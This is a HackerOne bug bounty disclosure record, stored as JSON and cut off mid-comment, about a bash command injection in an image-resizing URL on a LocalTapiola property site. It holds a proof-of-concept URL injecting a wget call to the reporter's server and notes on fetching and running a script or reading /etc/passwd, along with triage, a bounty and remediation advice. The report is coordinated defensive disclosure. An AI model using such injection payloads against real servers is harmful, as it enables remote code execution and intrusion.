{"id":303061,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDMwNjE=","url":"https://hackerone.com/reports/303061","title":"RCE using bash command injection on /system/images (toimitilat.lahitapiola.fi)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-01-07T17:29:46.126Z","submitted_at":"2018-01-07T17:29:46.126Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yonm13","url":"/yonm13","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-02-27T11:29:45.636Z","bug_reporter_agreed_on_going_public_at":"2018-02-27T11:29:45.523Z","team_member_agreed_on_going_public_at":"2018-02-27T04:31:18.717Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \nthe \"/system/images\" URL accepts a Base-64 encoded string, which is in turn used to convert images from the local disk before displaying them to the user. The website fails to validate the user input, allowing arbitrary bash command injection.\n\n**Description:** \nWhen surfing the toimitilat.lahitapiola.fi domain, an attacker may encounter URLs like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMj█████████ZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6B████ZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU███TAyeAY7BlQ/00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg```\n\nThe latter part is unnecessary, and the Base64 encoded string resolves to (with some non displayable characters).\n```\u0004\b[\b[\u0007:\u0006fI\"H2017/12/01/08_34_36_493_00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg\u0006:\u0006ET[\t:\u0006p:\fconvertI\")-strip -interlace Plane -quality 80%\u0006;\u0006T0[\b;\u0007:\nthumbI\"\t102x\u0006;```.\n\nThe 36 characters from after ' convertI\") ' until after the '80%' can be manipulated as the attacker wishes (padded by spaces to be exactly 36 characters), used to change the parameters injected to \"convert\" (by imagemagick, a library with multiple known vulnerabilities), and even inject arbitrary bash commands. e.g.\n```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl████████aXNpdnVfbHQuanBnB████████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y█████████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA ```\n\n(Injected command ``` \u0026\u0026 wget http://████████/d.html```).\nThis results in a 500 Error, as the server cannot return the image, but the action is performed as can be seen by attached PoC picture.\n\nThe 36 character limit poses limits on the attacker being able to exfiltrate data, which can probably be bypassed by creating a short runnable script in the running directory, (or downloading it from the internet using wget), then running it. I had started working towards a larger PoC (such as the /etc/passwd contents or equal), but have run out of time for today, hence reporting this with the \"wget\" PoC as this is quite a critical vulnerability, and it shouldn't wait until tomorrow. (This is an acceptable PoC for Remote Code Execution, as seen on HackerOne)\n\nPlease, feel free to ask additional questions, or consult about possible solutions.\n\n**Domain:** \ntoimitilat.lahitapiola.fi\n\n## Browsers / Apps Verified In:\nN/A\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Issue a request like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl███aXNpdnVfbHQuanBnB███████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y██████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA```\nreplacing my server's IP with an internet facing server under your control.\n  2. See the issued request.\n\n## Additional material\n\n  * Screenshots: \n1.\"Empty WGET\". - A simple, empty WGET request to my server.\n2.\"d.html\" WGET - A WGET request to my server, downloading a file named d.html successfuly\n3. Working folder disclosure through \"comment\" flag injection\n\n## Related reports, best practices\nhttps://www.cvedetails.com/vulnerability-list/vendor_id-1749/Imagemagick.html\nhttps://www.owasp.org/index.php/OS_Command_Injection_Defense_Cheat_Sheet\nhttps://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet\n\n## Impact\n\nThis can lead to the attacker controlling the Tapiola server, altering its contents, using it as part of a botnet etc.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003cbr\u003e\nthe \u0026quot;/system/images\u0026quot; URL accepts a Base-64 encoded string, which is in turn used to convert images from the local disk before displaying them to the user. The website fails to validate the user input, allowing arbitrary bash command injection.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003cbr\u003e\nWhen surfing the toimitilat.lahitapiola.fi domain, an attacker may encounter URLs like \u003ccode\u003ehttps://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMj█████████ZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6B████ZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU███TAyeAY7BlQ/00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThe latter part is unnecessary, and the Base64 encoded string resolves to (with some non displayable characters).\u003cbr\u003e\n\u003ccode\u003e[[:fI\u0026quot;H2017/12/01/08_34_36_493_00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg:ET[    :p:convertI\u0026quot;)-strip -interlace Plane -quality 80%;T0[;:\u003cbr\u003e\nthumbI\u0026quot; 102x;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe 36 characters from after \u0026#39; convertI\u0026quot;) \u0026#39; until after the \u0026#39;80%\u0026#39; can be manipulated as the attacker wishes (padded by spaces to be exactly 36 characters), used to change the parameters injected to \u0026quot;convert\u0026quot; (by imagemagick, a library with multiple known vulnerabilities), and even inject arbitrary bash commands. e.g.\u003cbr\u003e\n\u003ccode\u003ehttps://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl████████aXNpdnVfbHQuanBnB████████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y█████████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e(Injected command \u003ccode\u003e\u0026amp;\u0026amp; wget http://████████/d.html\u003c/code\u003e).\u003cbr\u003e\nThis results in a 500 Error, as the server cannot return the image, but the action is performed as can be seen by attached PoC picture.\u003c/p\u003e\n\n\u003cp\u003eThe 36 character limit poses limits on the attacker being able to exfiltrate data, which can probably be bypassed by creating a short runnable script in the running directory, (or downloading it from the internet using wget), then running it. I had started working towards a larger PoC (such as the /etc/passwd contents or equal), but have run out of time for today, hence reporting this with the \u0026quot;wget\u0026quot; PoC as this is quite a critical vulnerability, and it shouldn\u0026#39;t wait until tomorrow. (This is an acceptable PoC for Remote Code Execution, as seen on HackerOne)\u003c/p\u003e\n\n\u003cp\u003ePlease, feel free to ask additional questions, or consult about possible solutions.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDomain:\u003c/strong\u003e \u003cbr\u003e\ntoimitilat.lahitapiola.fi\u003c/p\u003e\n\n\u003ch2 id=\"browsers-apps-verified-in\"\u003eBrowsers / Apps Verified In:\u003c/h2\u003e\n\n\u003cp\u003eN/A\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e(Add details for how we can reproduce the issue)\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eIssue a request like \u003ccode\u003ehttps://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl███aXNpdnVfbHQuanBnB███████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y██████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA\u003c/code\u003e\nreplacing my server\u0026#39;s IP with an internet facing server under your control.\u003c/li\u003e\n\u003cli\u003eSee the issued request.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"additional-material\"\u003eAdditional material\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eScreenshots: \n1.\u0026quot;Empty WGET\u0026quot;. - A simple, empty WGET request to my server.\n2.\u0026quot;d.html\u0026quot; WGET - A WGET request to my server, downloading a file named d.html successfuly\n\n\u003col\u003e\n\u003cli\u003eWorking folder disclosure through \u0026quot;comment\u0026quot; flag injection\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"related-reports-best-practices\"\u003eRelated reports, best practices\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.cvedetails.com/vulnerability-list/vendor_id-1749/Imagemagick.html\" href=\"/redirect?url=https%3A%2F%2Fwww.cvedetails.com%2Fvulnerability-list%2Fvendor_id-1749%2FImagemagick.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.cvedetails.com/vulnerability-list/vendor_id-1749/Imagemagick.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://www.owasp.org/index.php/OS_Command_Injection_Defense_Cheat_Sheet\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FOS_Command_Injection_Defense_Cheat_Sheet\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/index.php/OS_Command_Injection_Defense_Cheat_Sheet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FInjection_Prevention_Cheat_Sheet\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis can lead to the attacker controlling the Tapiola server, altering its contents, using it as part of a botnet etc.\u003c/p\u003e\n","bounty_amount":"6800.0","formatted_bounty":"$6,800","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":201,"voters":["jokebookservice1","lexx","flamezzz","irvinlim","putsi","sp1d3rs","jr0ch17","cdl","kapytein","europa","and 191 more..."],"severity":{"rating":"high","score":8.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":1053,"asset_type":"URL","asset_identifier":"toimitilat.lahitapiola.fi","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2268429,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\n\n*Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report and http://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/. Also, our policy contains a lot of information on what is relevant and what is not.*","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eNote: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - \u003ca title=\"https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" href=\"/redirect?url=https%3A%2F%2Fsupport.hackerone.com%2Fhc%2Fen-us%2Farticles%2F211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca title=\"http://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/\" href=\"/redirect?url=http%3A%2F%2Fblog.bugcrowd.com%2Fadvice-for-writing-a-great-vulnerability-report%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Also, our policy contains a lot of information on what is relevant and what is not.\u003c/em\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-07T17:32:57.860Z","updated_at":"2018-01-07T17:32:57.860Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2268430,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-07T17:35:19.613Z","updated_at":"2018-01-07T17:35:19.613Z","additional_data":{"old_title":"[toimitilat.lahitapiola.fi] RCE using bash command injection on /system/images","new_title":"RCE using bash command injection on /system/images (toimitilat.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2268431,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-07T17:35:44.721Z","updated_at":"2018-01-07T17:35:44.721Z","additional_data":{"old_severity":"High","new_severity":"High (8.4)","old_severity_id":106381,"new_severity_id":106383},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2268433,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yonm13 nice to see a quality report. Now let me get this straight, from a vulnerability and patching point of view, what we are seeing here is a imagemagick vulnerability right? So potentially this could be fixed by patching this one software? Or is this an unpatched (as in no vendor patch available as we speak) vuln you are exploiting?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/yonm13\"\u003e@yonm13\u003c/a\u003e nice to see a quality report. Now let me get this straight, from a vulnerability and patching point of view, what we are seeing here is a imagemagick vulnerability right? So potentially this could be fixed by patching this one software? Or is this an unpatched (as in no vendor patch available as we speak) vuln you are exploiting?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-07T17:43:06.803Z","updated_at":"2018-01-07T17:43:22.958Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2268463,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@localtapiola-thomas Thank you!\n\nTo your question - No, it is not. It is an exploitation of non-secure coding.\n\nMy report may have been misleading as I had pointed you guys towards additional vulnerabilities in ImageMagick. Although it is a problematic package with multiple past findings, and should always be kept as up-to-date as possible, the things found on the internet are mostly related to user uploaded FILES processed by the tool ('convert').\n \nThis is not the case here. This report is about a non secure code by the coders who implemented this website; They are most likely calling an external tool using a call to a function to run a Linux Bash command (as the website uses Ruby, most likely in one of the methods mentioned here: https://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby). This is generally a bad method to do things, as it exposes an additional attack surface, but sometimes a coder has no choice. When done, though, this has to be kept as far away as possible from the user viewing the website (behind the scenes, preferably for very specific command only).\n\nIn this aforementioned example, the web server provides parameters to this system call, taken from the user (!). This is double as problematic, and should be patched as soon as possible.","markdown_message":"\u003cp\u003e\u003ca href=\"/localtapiola-thomas\"\u003e@localtapiola-thomas\u003c/a\u003e Thank you!\u003c/p\u003e\n\n\u003cp\u003eTo your question - No, it is not. It is an exploitation of non-secure coding.\u003c/p\u003e\n\n\u003cp\u003eMy report may have been misleading as I had pointed you guys towards additional vulnerabilities in ImageMagick. Although it is a problematic package with multiple past findings, and should always be kept as up-to-date as possible, the things found on the internet are mostly related to user uploaded FILES processed by the tool (\u0026#39;convert\u0026#39;).\u003c/p\u003e\n\n\u003cp\u003eThis is not the case here. This report is about a non secure code by the coders who implemented this website; They are most likely calling an external tool using a call to a function to run a Linux Bash command (as the website uses Ruby, most likely in one of the methods mentioned here: \u003ca title=\"https://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby\" href=\"/redirect?url=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F2232%2Fcalling-shell-commands-from-ruby\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). This is generally a bad method to do things, as it exposes an additional attack surface, but sometimes a coder has no choice. When done, though, this has to be kept as far away as possible from the user viewing the website (behind the scenes, preferably for very specific command only).\u003c/p\u003e\n\n\u003cp\u003eIn this aforementioned example, the web server provides parameters to this system call, taken from the user (!). This is double as problematic, and should be patched as soon as possible.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-07T18:14:30.718Z","updated_at":"2018-01-07T18:14:30.718Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2268483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the clarification. I cannot promise or guarantee any schedules for fixing this - this is a new target in our scope, managed by a third party, but we will go ahead and start the triaging process as soon as possible.","markdown_message":"\u003cp\u003eThanks for the clarification. I cannot promise or guarantee any schedules for fixing this - this is a new target in our scope, managed by a third party, but we will go ahead and start the triaging process as soon as possible.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-07T18:27:27.159Z","updated_at":"2018-01-07T18:27:27.159Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2269127,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Got it. I hope this does help improve your security :)\nWould you like me to proceed investigating and exploiting in order to find out the full potential of this vulnerability? Or should I stop here?","markdown_message":"\u003cp\u003eGot it. I hope this does help improve your security :)\u003cbr\u003e\nWould you like me to proceed investigating and exploiting in order to find out the full potential of this vulnerability? Or should I stop here?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-08T09:06:56.341Z","updated_at":"2018-01-08T09:06:56.341Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2269135,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Our security fellow has verified this, we are looking at options on how to coordinate a fix. At the moment, nothing further is expected from you - I will let you know and keep you updated.","markdown_message":"\u003cp\u003eOur security fellow has verified this, we are looking at options on how to coordinate a fix. At the moment, nothing further is expected from you - I will let you know and keep you updated.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-08T09:11:31.855Z","updated_at":"2018-01-08T09:11:31.855Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2274445,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have been informed that fixes are being investigated at the moment. No further details available for now.","markdown_message":"\u003cp\u003eI have been informed that fixes are being investigated at the moment. No further details available for now.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-10T10:08:11.258Z","updated_at":"2018-01-10T10:08:11.258Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2279223,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi. We have decided to award you with a bounty. Some background and reasoning: This domain does not contain any personal information. The server is not in the same network nor physical premises as the more critical infrastructure is. Hence the bounty for this domain is smaller, because the overall impact of the RCE is significantly smaller than it would be in our critical infrastructure. We hope you are happy with our reasoning and the bounty. We appreciate our effort in investigating and reporting this - the report was good in every sense. Please note that this issue is NOT YET RESOLVED, and this report will not be closed as of yet. ","markdown_message":"\u003cp\u003eHi. We have decided to award you with a bounty. Some background and reasoning: This domain does not contain any personal information. The server is not in the same network nor physical premises as the more critical infrastructure is. Hence the bounty for this domain is smaller, because the overall impact of the RCE is significantly smaller than it would be in our critical infrastructure. We hope you are happy with our reasoning and the bounty. We appreciate our effort in investigating and reporting this - the report was good in every sense. Please note that this issue is NOT YET RESOLVED, and this report will not be closed as of yet. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-11T23:04:14.405Z","updated_at":"2018-01-11T23:04:14.405Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"6300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"yonm13","url":"/yonm13"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2287779,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the bounty! I understand the reasoning, and highly appreciate the quick response. Pleasure working with you guys.","markdown_message":"\u003cp\u003eThank you for the bounty! I understand the reasoning, and highly appreciate the quick response. Pleasure working with you guys.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-16T15:10:16.381Z","updated_at":"2018-01-16T15:10:16.381Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2299970,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yonm13 - a fix has been deployed, could you check if it is ok, or are you still able to break it?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/yonm13\"\u003e@yonm13\u003c/a\u003e - a fix has been deployed, could you check if it is ok, or are you still able to break it?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-19T08:24:06.632Z","updated_at":"2018-01-19T08:24:06.632Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2300382,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @localtapiola-thomas ,\nYes, it appears to still be vulnerable. In fact, the original link still works. (Produces an HTTP GET request to my server).\nA new PoC of the RCE is appended as 'PoC-OldMethodRCEAfterFix.png'\n\nMoreover, I've examined the website with the fix applied to see what was changed. It seems that instead of replacing the old method (some images are still served with it), a new method was ADDED. \nI've examined the new method as well, so to see what would happen if the older one was removed. \nIt appears to be very similar, just more organized (no Non-readable Characters), and injecting parameters is still possible. As a PoC I'm appending a picture fetched with the NEW Method, originally intended to be resized as a small thumbnail, I've Flipped it and Enlarged it using parameter injection. This can be used to overload your server ( i.e. DoS), as resizing images is a resource-heavy process, and as I can inject parameters, I can ask the server to resize an image to huge dimensions with only a single request. \nThe PoC is appended as 'PoC - NewMethodIsStillBad.png'.\n\nA third picture is RCE with the new method, to show that it is still exploitable, even if the old one was to not be used anymore.\n'PoC- New Method RCE.png'\n\nI would recommend saving various copies of the served images, (this can be done using a script), and just serving them statically to the user. Resizing on-the-go using user supplied parameters is a door to problems. \nIf that is absolutely not possible, take the parameters from the user (like Quality, ThumbSize), and validate their authenticity. For example, quality should be a number from 0-100, thumb size should be a number between 50-500 (beware of very large numbers). If you also need to take parameter names ('Interlace\", \"strip\") etc., make a list of the allowed values and validate against it. The user supplied value should only be used in the command AFTER it is sanitized. Once again, this must be done correctly in order to avoid further problems, and it is better to just avoid the process of inserting user supplied input into OS commands, if possible.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/localtapiola-thomas\"\u003e@localtapiola-thomas\u003c/a\u003e 